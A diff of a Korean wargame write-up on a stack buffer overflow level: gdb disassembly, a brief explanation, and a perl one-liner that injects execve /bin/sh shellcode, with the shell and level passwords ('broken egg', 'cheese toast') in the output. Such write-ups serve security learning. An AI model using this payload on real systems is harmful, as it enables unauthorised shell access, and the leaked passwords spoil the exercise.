@@ -227,10 +227,6 @@ gdb로 lv4가 무슨 프로그램인지 확인해보자.
 
 그러나 함수의 인자부분은 지우지 않는 것을 확인할 수 있으므로  
 44바이트의 쓰레기값과 4바이트의 주소값을 넣어 준 후 뒤에 nop와 쉘코드를 넣어준다.
-```
-perl -e 'print
-"a"x47,"\xff","\x90"x200,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
-```
 
 ```
 lv3@ubuntu:~$ ./lv4 `perl -e 'print "a"x44,"\xac\xd3\xff\xff","\x90"x200,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
@@ -247,7 +243,101 @@ $
 알아낸 lv4 비번 : broken egg
 
 ## lv 4
+gdb로 lv5가 무슨 프로그램인지 확인해보자.
+```
+   0x08048500 <+0>:	push   ebp
+   0x08048501 <+1>:	mov    ebp,esp
+   0x08048503 <+3>:	sub    esp,0x2c
+   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x0804850a <+10>:	jg     0x8048523 <main+35>
+   0x0804850c <+12>:	push   0x8048640
+   0x08048511 <+17>:	call   0x8048410 <printf@plt>
+   0x08048516 <+22>:	add    esp,0x4
+   0x08048519 <+25>:	push   0x0
+   0x0804851b <+27>:	call   0x8048420 <exit@plt>
+   0x08048520 <+32>:	add    esp,0x4
+   0x08048523 <+35>:	nop
+   0x08048524 <+36>:	mov    DWORD PTR [ebp-0x2c],0x0
+   0x0804852b <+43>:	nop
+   0x0804852c <+44>:	lea    esi,[esi+eiz*1+0x0]
+   0x08048530 <+48>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x08048533 <+51>:	lea    edx,[eax*4+0x0]
+   0x0804853a <+58>:	mov    eax,ds:0x8049760
+   0x0804853f <+63>:	cmp    DWORD PTR [eax+edx*1],0x0
+   0x08048543 <+67>:	jne    0x8048547 <main+71>
+   0x08048545 <+69>:	jmp    0x8048587 <main+135>
+   0x08048547 <+71>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x0804854a <+74>:	lea    edx,[eax*4+0x0]
+   0x08048551 <+81>:	mov    eax,ds:0x8049760
+   0x08048556 <+86>:	mov    edx,DWORD PTR [eax+edx*1]
+   0x08048559 <+89>:	push   edx
+   0x0804855a <+90>:	call   0x80483f0 <strlen@plt>
+   0x0804855f <+95>:	add    esp,0x4
+   0x08048562 <+98>:	mov    eax,eax
+   0x08048564 <+100>:	push   eax
+   0x08048565 <+101>:	push   0x0
+   0x08048567 <+103>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x0804856a <+106>:	lea    edx,[eax*4+0x0]
+   0x08048571 <+113>:	mov    eax,ds:0x8049760
+   0x08048576 <+118>:	mov    edx,DWORD PTR [eax+edx*1]
+   0x08048579 <+121>:	push   edx
+   0x0804857a <+122>:	call   0x8048430 <memset@plt>
+   0x0804857f <+127>:	add    esp,0xc
+   0x08048582 <+130>:	inc    DWORD PTR [ebp-0x2c]
+   0x08048585 <+133>:	jmp    0x8048530 <main+48>
+   0x08048587 <+135>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x0804858a <+138>:	add    eax,0x4
+   0x0804858d <+141>:	mov    edx,DWORD PTR [eax]
+   0x0804858f <+143>:	add    edx,0x2f
+   0x08048592 <+146>:	cmp    BYTE PTR [edx],0xff
+   0x08048595 <+149>:	je     0x80485b0 <main+176>
+   0x08048597 <+151>:	push   0x804864c
+   0x0804859c <+156>:	call   0x8048410 <printf@plt>
+   0x080485a1 <+161>:	add    esp,0x4
+   0x080485a4 <+164>:	push   0x0
+   0x080485a6 <+166>:	call   0x8048420 <exit@plt>
+   0x080485ab <+171>:	add    esp,0x4
+   0x080485ae <+174>:	mov    esi,esi
+   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080485b3 <+179>:	add    eax,0x4
+   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
+   0x080485b8 <+184>:	push   edx
+   0x080485b9 <+185>:	lea    eax,[ebp-0x28]
+   0x080485bc <+188>:	push   eax
+   0x080485bd <+189>:	call   0x8048440 <strcpy@plt>
+   0x080485c2 <+194>:	add    esp,0x8
+   0x080485c5 <+197>:	lea    eax,[ebp-0x28]
+   0x080485c8 <+200>:	push   eax
+   0x080485c9 <+201>:	push   0x8048669
+   0x080485ce <+206>:	call   0x8048410 <printf@plt>
+   0x080485d3 <+211>:	add    esp,0x8
+   0x080485d6 <+214>:	push   0x28
+   0x080485d8 <+216>:	push   0x0
+   0x080485da <+218>:	lea    eax,[ebp-0x28]
+   0x080485dd <+221>:	push   eax
+   0x080485de <+222>:	call   0x8048430 <memset@plt>
+   0x080485e3 <+227>:	add    esp,0xc
+   0x080485e6 <+230>:	leave  
+   0x080485e7 <+231>:	ret    
+   ```
+lv3문제와 큰 차이가 없다.  
+마지막에 버퍼를 초기화하는 memset이 추가되었을 뿐이다.  
+그러나 sfp와 ret부분은 살아있다.
 
+함수 인자부부은 여전히 살아있는 것을 알 수 있으므로  
+lv3와 같은 방법으로 문제를 풀어주면 될것이다.
+```
+lv4@ubuntu:~$ ./lv5 `perl -e 'print "a"x44,"\xb0\xd3\xff\xff","\x90"x200,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1��1̀�É�1��F̀1�Ph//shh/bin��PS���°
+                                           1��̀
+$ whoami
+lv5
+$ id
+uid=1005(lv5) gid=1004(lv4) groups=1004(lv4)
+$ my-pass
+cheese toast
+$ 
+```
 ## lv 5
 ## lv 6
 ## lv 7
